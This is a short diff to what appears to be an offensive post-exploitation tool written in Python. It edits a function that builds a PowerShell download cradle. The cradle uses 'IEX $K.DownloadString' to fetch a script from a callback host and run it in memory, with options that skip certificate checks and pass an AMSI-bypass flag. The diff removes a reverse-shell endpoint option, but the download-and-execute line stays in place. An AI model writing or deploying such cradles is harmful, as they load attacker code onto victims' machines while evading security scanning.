@@ -105,13 +105,8 @@ webdav_url = 'http://%s:%d/webdav' % (
     args.LPORT,
 )
 
-endpoints = {
-    'hub': "h",
-    'reverse_shell': "r",
-}
 
-
-def build_cradle(get_args, flavor="hub"):
+def build_cradle(get_args):
     result = ""
     if get_args['Transport'] == 'https':
         if get_args['NoVerification'] == 'true':
@@ -139,11 +134,10 @@ def build_cradle(get_args, flavor="hub"):
             clip_exec = "&c=%s" % get_args['ClipExec']
         else:
             clip_exec = ""
-        result += "IEX $K.DownloadString('%s0?t=%s&f=%s&a=%s%s');"
+        result += "IEX $K.DownloadString('%s0?t=%s&a=%s%s');"
         result = result % (
             callback_urls[get_args['Transport']],
             get_args['Transport'],
-            endpoints[flavor],
             get_args['Amsi'],
             clip_exec,
         )
